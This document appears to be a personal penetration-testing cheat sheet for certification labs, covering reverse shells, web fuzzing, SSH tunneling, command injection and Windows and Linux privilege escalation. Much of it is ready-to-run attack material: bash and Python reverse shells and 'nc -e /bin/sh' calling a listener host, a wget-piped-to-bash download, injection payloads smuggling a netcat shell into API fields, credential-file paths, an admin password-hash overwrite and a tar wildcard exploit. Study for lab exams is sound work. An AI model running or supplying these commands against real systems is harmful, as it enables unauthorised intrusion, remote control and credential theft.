# Table of Content
- [General](#general)
  - [Important Files](#important-files)
  - [Reverse Shell](#reverse-shell)
- [SQL](#sql)
  - [MYSQL](#mysql)
- [Tools](#tools)
  - [feroxbuster](#feroxbuster)
  - [gobuster](#gobuster)
  - [wfuzz](#wfuzz)
  - [wget](#wget)
  - [Python](#python)
  - [hashcat](#hashcat)
- [SSH](#ssh)
  - [SSH KEY](#ssh-key)
  - [SSH Tunneling](#ssh-tunneling)
- [Web Attacks](#web-attacks)
  - [Local File Inclusion](#local-file-inclusion)
- [Windows Privilege Escalation](#windows-privilege-escalation)
  - [Manual Enumeration](#manual-enumeration)
  - [Service Binary Hijacking](#service-binary-hijacking)
  - [Service DLL Hijacking](#service-dll-hijacking)
  - [Unquoted Service Paths](#unquoted-service-paths)
  - [Scheduled Tasks](#scheduled-tasks)
  - [SeImpersonatePrivilege](#seimpersonateprivilege)
  - [SeBackupPrivilege](#sebackupprivilege)
- [Linux Privilege Escalation](#linux-privilege-escalation)
  - [Linux Manual Enumeration](#linux-manual-enumeration)
  - [Common Linux Privilege Escalation](#common-linux-privilege-escalation)

# General
## Important Files
- Windows

```bash

C:/Users/Administrator/NTUser.dat
```
- Linux
```bash
/var/mail
/config/.htusers.php
/proc/self/environ
/proc/self/cmdline
/home/user/.bash_history
/home/user/.bash_aliases
/etc/passwd
/etc/shadow
/etc/aliases

# python related
main.py
app.py
settings.ini
applicationName.config
applicationName.cfg
```

## Reverse Shell
```bash
# bash reverse shell
bash -i >& /dev/tcp/192.168.45.x/80 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.45.x/80 0>&1'

# python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# when escaping double quotes
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.175\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
# when using os
os.system('nc 192.168.45.175 80 -e /bin/sh')
```

# SQL
## MYSQL
```bash
mysql -u 'root' -h 192.168.183.122 -p
show databases;
use user;
show tables;
select * from users_secure;
update users_secure SET password="$2y$10$R0cpsKNLDqDZpfxDCaq8Qufxl0uLbmwiL0k6XDR1kPBDXVIYbeQ0W" WHERE username="admin"
```

## Tools
### feroxbuster 
```bash
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.222.62/ -C 404,401,403,502,500 -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config
feroxbuster -u http://192.168.209.153:8000/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config -t 200
```

### gobuster
```bash
gobuster dir -u http://192.168.167.109/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

### curl
![image](https://github.com/nuricheun/OSCP/assets/14031269/83b00a36-8468-4e38-a5c9-3cf2eb68cbbd)
```bash
# -v : When the web page looks like above, use -v for debugging and getting extra information about the response from server
We can find the stack information as well(ex. saltstack)
curl -v target:port

# directory traversal
curl --path-as-is http://192.168.x.x/../../../../../../etc/passwd
```

### wfuzz
```bash
# Fuzz for any files we can find
wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=FUZZ

# Fuzz for any files in our current directory
wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py

```

### wget
```bash
# Download a file and execute it
wget -O - http://192.168.45.175:443/lse.sh | bash

```

### Python
```bash
# When encoding characters;
python3 -c 'import urllib.parse; original_string = "\n"; url_encoded_string = urllib.parse.quote(original_string); print(url_encoded_string);'
%0A
```

### Hashcat
```bash
# $2a: 3200
($2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS)
hashcat -m 3200 dora /usr/share/wordlists/rockyou.txt --force


```


# SSH
## SSH Keygen
- See if other users can login as root using ssh key

```bash
# Generate ssh key:
ssh-keygen

# Connect with ssh key:
ssh -i id_rsa root@192.168.x.x

# To handle "Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures" error:
ssh -i id_rsa root@192.168.x.x -o IdentitiesOnly=yes
```

## SSH Tennling
```bash
# Local port forwarding
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

# Local dynamic port forwarding
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

# Remote port forwarding
sudo systemctl start ssh
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4

# Remote dynamic port forwarding
ssh -N -R 9998 kali@192.168.118.4
```


# Web Attacks
## Checklist
- Gobuster
- Feroxbuster
- nikto
- admin:admin admin:password admin:null
- CMS exploit
- View page/page sources
- Local File Inclusion
  - Click stuff to find out if we can find this ?file, ?page
  - ?file=zip://uploads/upload_xkxkxk.zip%23simple-backdoor&cmd=whoami
- POST/GET with burp suite
- Any .config, .conf files?

## General Tips!
- Open the website and view page/page sources
  - gobuster: wait until it is finished since some important directories show up later!(ex. /under_construction)
  - feroxbuster
  - run nikto
- We should try both POST and GET request using the key variable(ex. UC404)
  - Try with GET request
    - http://192.168.x.x/api?var=whoami
    - http://192.168.x.x/api?var=%0awhoami
    - http://192.168.x.x/api?var=;whoami
  - Try with POST request
    - Intercept the request with Burp Suite
- WAF bypass: X-Forwarded-For:127.0.0.1
- When we're dealing with python server, see if we can use os module and send "nc 192.168.45.175 80 -e /bin/sh" when we find data entry

## When it's api response
```bash
# curl -v can give you more information about this api
curl -v http://192.168.x.x:port

# Try sending get request to any found apis with found or possible argument
http://192.168.183.117:50000/verify?code=os

# Try sending post request to any found apis
curl -X post --data "code=2*2" http://192.168.183.117:50000/verify --proxy 127.0.0.1:8080
curl -X post --data "code=os.system('nc 192.168.45.175 80 -e /bin/sh')" http://192.168.183.117:50000/verify --proxy 127.0.0.1:8080
curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;nc 192.168.45.175 80 -e /bin/bash"}' -H 'Content-Type: application/json'  http://192.168.222.134:13337/update
```

## When it's using Filemanater
- See if any directory is showing same contents as ohter ports like FTP, SMB
- If our key file we should obtain is php file, we can't read it on the web so likely that we need to transfer it to FTP,SMB so make sure if any directory can be searched through smb/ftp
- When we're changing download path, try ./Documents/ or /Documents/ or Documents/

## Input form
- SQLi? Command injection?
- Try with GET request
  - http://192.168.x.x/api?var=whoami
  - http://192.168.x.x/api?var=%0awhoami
  - http://192.168.x.x/api?var=;whoami
- Try with POST request
  - Intercept the request with Burp Suite

## Directory Traversal
- Make sure to read and try exploit codes' examples
- Use curl --path-as-is or burp suite
- Check .ssh directory
- Check if we can read other vulnerable app's config file through this vulnerability
- Check other user's home directories to see the name of the files(pg practice cassandra)
- If wget doesn't work, maybe it only requires very simple way to get through: such as pivot as other users)


## Local File Inclusion
- Make sure to check "important files" list
- Make sure to see what files we can find using wfuzz on our current location
  - Make sure to check file extension(.py, .js, .conf, .config...)

```bash
# Local File Inclusion...
wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py

```


# Windows Privilege Escalation

## Manual Enumeration

```bash
#User information&hostname
whoami
whoami /priv
whoami /groups
whoami /all

#Existing users and groups
net user
  Get-LocalUser
net localgroup
  Get-LocalGroup
net localgroup adminteam
  Get-LocalGroupMember adminteam

#System information
systeminfo

#IP
ipconfig /all

#Routing table
route print

#Active network
netstat -ano

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# cmdkey /list

#Installed Applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
C:\Program Files\...
C:\Program Files (x86)\...

#Running processes
Get-Process

#Juicy files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.git,*.gitconfig,*.config -File -Recurse -ErrorAction SilentlyContinue
Check every user's directory && desktop && documents && downloads

dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt

#Powershell History
Get-History
(Get-PSReadlineOption).HistorySavePath
  type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Users\Public\Transcript...

```

## Service Binary Hijacking
```bash

# Get a list of all installed windows services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}
sc query | findstr /i servname

# Check StartMode
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.State -like 'Running'}
sc qc servicename

# Search for Modifiable services/executables with PowerUP.ps1
. .\PowerUp.ps1
Get-ModifiableServiceFile

icacls "C:\xampp\apache\bin\httpd.exe"

#restart service
net stop service && net start service
Restart-Service service

#When we can't restart the service but we have seshutdown privilege
shutdown /r /t 0

```

## Service DLL Hijacking
```bash
```

## Scheduled Tasks
```bash
# Scheduled tasks: Check Process || query schtasks
Get-ScheduledTask
schtasks /query /fo LIST /v
Get-Process
  Focus on Last Run Time, Next Run Time, Run As User Task To Run
  Check executable path with icacls to see if we can replace the exe file

# Or Find Process with Watch-Command.ps1 https://github.com/markwragg/PowerShell-Watch/blob/master/README.md
> . .\Watch-Command.ps1
> Watch-Command -ScriptBlock { Get-Process }

```

## Unquoted Service Paths
```bash
```

## SeImpersonatePrivilege

# Linux Privilege Escalation
## Linux Manual Enumeration

```bash
# User context
id
hostname

# Search for flags
find / -type f -name 'local.txt' 2>/dev/null
find / -type f -name 'proof.txt' 2>/dev/null

# Check User files(Everyone if you can)
cat /home/user/.bash_aliases
cat /home/user/.bash_history

# Check config files
/var/www/html/sites/default/config.php

# Enumerate other userse(This is really important because we might have to pivot to other users)
cat /etc/passwd

# Operating system release and version
cat /etc/issue
cat /etc/os-release

# Kernel version and architecture
uname -a

# Running process
ps aux
ps auxwww

# Network interface
ip a

# Route
routel

# Active network connections
ss -anp

# Firewall rule
cat /etc/iptables/rules.v4

# Cronjob
ls -lah /etc/cron*
cat /etc/crontab
crontab -l

# Installed applications
dpkg -l

# Every directory writable by the current user
find / -writable -type d 2>/dev/null

# SUID-marked binaries
find / -perm -u=s -type f 2>/dev/null

# List all mounted filesystems
mount

# List all drives that will be mounted at boot time
cat /etc/fstab

# List all available disks
lsblk
```

## Linux Privilege Strategy
- When current user can't use wget that probably means we need to pivot as someone else
- See if other person can ssh as root(check important files such as .bash_history, .bash_aliases)
- If the current user can run webserver on victim machine, it's likely that we can only access that port on the same machine
- 

## Common Linux Privilege Escalation
### tar with wilrdcard
```bash
echo "/bin/bash -c '-i >& /dev/tcp/192.168.45.175/80 0>&1" > shell.sh
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=bash shell.sh"
```
